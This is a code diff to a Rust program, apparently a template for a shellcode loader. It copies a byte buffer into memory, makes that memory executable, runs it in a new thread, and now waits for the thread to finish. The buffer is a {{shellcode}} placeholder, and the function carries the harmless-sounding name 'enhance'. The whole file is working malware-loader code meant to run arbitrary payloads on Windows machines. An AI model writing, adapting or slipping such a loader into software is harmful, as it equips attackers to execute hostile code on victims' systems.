@@ -4,6 +4,7 @@ use windows::Win32::System::Memory::PAGE_PROTECTION_FLAGS;
 use windows::Win32::System::Threading::CreateThread;
 use windows::Win32::System::Threading::THREAD_CREATION_FLAGS;
 use windows::Win32::System::Memory::{MEM_COMMIT, PAGE_EXECUTE_READ, PAGE_READWRITE};
+use windows::Win32::System::Threading::WaitForSingleObject;
 
 fn enhance(buf:&[u8]) {
     unsafe {
@@ -12,12 +13,13 @@ fn enhance(buf:&[u8]) {
         std::ptr::copy_nonoverlapping(buf.as_ptr(), alloc_ptr, buf.len());
         let mut old_perms: PAGE_PROTECTION_FLAGS = PAGE_EXECUTE_READ;
         VirtualProtect(alloc, buf.len(), PAGE_EXECUTE_READ, &mut old_perms,);
-        let _resCT = CreateThread(None, 0, Some(std::mem::transmute(alloc)), None, THREAD_CREATION_FLAGS(0), None).unwrap();
+        let res_ct = CreateThread(None, 0, Some(std::mem::transmute(alloc)), None, THREAD_CREATION_FLAGS(0), None).unwrap();
+        let _ = WaitForSingleObject(res_ct, u32::MAX);
     }
 }
 
 fn main() {
 
-    let buf: Vec<u8> = vec![{{SHELLCODE}}];
+    let buf: Vec<u8> = vec![{{shellcode}}];
     enhance(&buf);
 }
